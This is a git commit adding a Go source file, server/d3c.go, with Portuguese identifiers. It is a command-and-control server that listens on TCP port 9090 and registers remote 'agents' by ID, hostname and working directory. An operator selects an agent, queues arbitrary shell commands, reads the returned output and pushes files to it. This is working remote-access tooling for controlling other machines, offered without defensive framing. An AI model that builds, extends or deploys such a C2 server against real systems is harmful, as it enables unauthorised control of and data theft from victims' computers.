533e25228a8cd3064f83643088a38d49f51cbd82
Francisco Stringuetta <56653668+fstringuetta@users.noreply.github.com>
2023-05-02 09:59:29 -0300

    Create d3c.go

---
+++ server/d3c.go
@@ -0,0 +1,195 @@
+package main
+
+import (
+	"bufio"
+	"d3c/commons/estruturas"
+	"d3c/commons/helpers"
+	"encoding/gob"
+	"log"
+	"net"
+	"os"
+	"strings"
+)
+
+var (
+	agentesEmCampo    = []estruturas.Mensagem{}
+	agenteSelecionado = ""
+)
+
+func main() {
+	log.Println("Entrei em execução")
+
+	go startListener("9090")
+
+	cliHandler()
+}
+
+func cliHandler() {
+	for {
+		if agenteSelecionado != "" {
+			print(agenteSelecionado + "@D3C# ")
+
+		} else {
+			print("D3C> ")
+		}
+
+		//
+		reader := bufio.NewReader(os.Stdin)
+		comandoCompleto, _ := reader.ReadString('\n')
+
+		comandoSeparado := helpers.SeparaComando(comandoCompleto)
+		comandoBase := strings.TrimSpace(comandoSeparado[0])
+
+		if len(comandoBase) > 0 {
+			switch comandoBase {
+			case "show":
+				showHandler(comandoSeparado)
+			case "select":
+				selectHandler(comandoSeparado)
+			case "send":
+				if len(comandoSeparado) > 1 && agenteSelecionado != "" {
+					var erro error
+					arquivoParaEnviar := &estruturas.Arquivo{}
+					
+					arquivoParaEnviar.Nome = comandoSeparado[1]
+					arquivoParaEnviar.Conteudo, erro = os.ReadFile(arquivoParaEnviar.Nome)
+
+					comandoSend := &estruturas.Commando{}
+					comandoSend.Comando = comandoSeparado[0]
+					comandoSend.Arquivo = *arquivoParaEnviar
+
+					if erro != nil {
+						log.Println("Erro ao abrir o arquivo: ", erro.Error())
+					} else {
+						agentesEmCampo[posicaoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoSend)
+					}
+
+				} else {
+					log.Println("Especifique o arquivo a ser enviado.")
+				}
+
+			//case "get":
+			default:
+				if agenteSelecionado != "" {
+					comando := &estruturas.Commando{}
+					comando.Comando = comandoCompleto
+
+					for indice, agente := range agentesEmCampo {
+						if agente.AgentID == agenteSelecionado {
+							// Adicionar na mensagem desse agente o comando recebido pela CLI
+							agentesEmCampo[indice].Comandos = append(agentesEmCampo[indice].Comandos, *comando)
+						}
+					}
+				} else {
+					log.Println("O comando digitado não existe!")
+				}
+			}
+		}
+
+	}
+
+}
+
+func showHandler(comando []string) {
+	if len(comando) > 1 {
+		switch comando[1] {
+		case "agentes":
+			for _, agente := range agentesEmCampo {
+				println("Agente ID: " + agente.AgentID + "->" + agente.AgentHostname + "@" + agente.AgentCWD)
+			}
+		default:
+			log.Println("O parametro selecionado nao existe.")
+		}
+	}
+
+}
+
+func selectHandler(comando []string) {
+	if len(comando) > 1 {
+		if agenteCadastrado(comando[1]) {
+			agenteSelecionado = comando[1]
+		} else {
+			log.Println("O Agente selecionado não está em campo.")
+			log.Println("Para listar os Agentes em campo use: show agentes")
+		}
+
+	} else {
+		agenteSelecionado = ""
+
+	}
+}
+
+func agenteCadastrado(agentID string) (cadastrado bool) {
+	cadastrado = false
+
+	for _, agente := range agentesEmCampo {
+		if agente.AgentID == agentID {
+			cadastrado = true
+		}
+	}
+
+	return cadastrado
+}
+
+func mensagemContemResposta(mensagem estruturas.Mensagem) (contem bool) {
+	contem = false
+
+	for _, comando := range mensagem.Comandos {
+		if len(comando.Resposta) > 0 {
+			contem = true
+		}
+	}
+
+	return contem
+}
+
+func posicaoAgenteEmCampo(agenteId string) (posicao int) {
+	for indice, agente := range agentesEmCampo {
+		if agenteId == agente.AgentID {
+			posicao = indice
+		}
+	}
+	return posicao
+}
+
+func startListener(port string) {
+	listerner, err := net.Listen("tcp", "0.0.0.0:"+port)
+
+	if err != nil {
+		log.Fatal("Erro ao iniciar o Listerner: ", err.Error())
+	} else {
+		for {
+			canal, err := listerner.Accept()
+			defer canal.Close()
+
+			if err != nil {
+				log.Println("Erro em um novo canal: ", err.Error())
+			} else {
+				mensagem := &estruturas.Mensagem{}
+
+				gob.NewDecoder(canal).Decode(mensagem)
+
+				// Verificar se o Agente já foi apresentado anteriormente
+				if agenteCadastrado(mensagem.AgentID) {
+					if mensagemContemResposta(*mensagem) {
+						log.Println("Resposta do Host: ", mensagem.AgentHostname)
+						// Exibir as respostas
+						for _, comando := range mensagem.Comandos {
+							log.Println("Resposta do Comando: ", comando.Comando)
+							println(comando.Resposta)
+						}
+					}
+					// Enviar a lista de comandos enfileirados para o agente
+					gob.NewEncoder(canal).Encode(agentesEmCampo[posicaoAgenteEmCampo(mensagem.AgentID)])
+					// Zerar a lista de comandos do agente
+					agentesEmCampo[posicaoAgenteEmCampo(mensagem.AgentID)].Comandos = []estruturas.Commando{}
+				} else {
+					log.Println("Nova conexão: ", canal.RemoteAddr().String())
+					log.Println("Agente ID: ", mensagem.AgentID)
+					agentesEmCampo = append(agentesEmCampo, *mensagem)
+					gob.NewEncoder(canal).Encode(mensagem)
+				}
+			}
+		}
+	}
+}
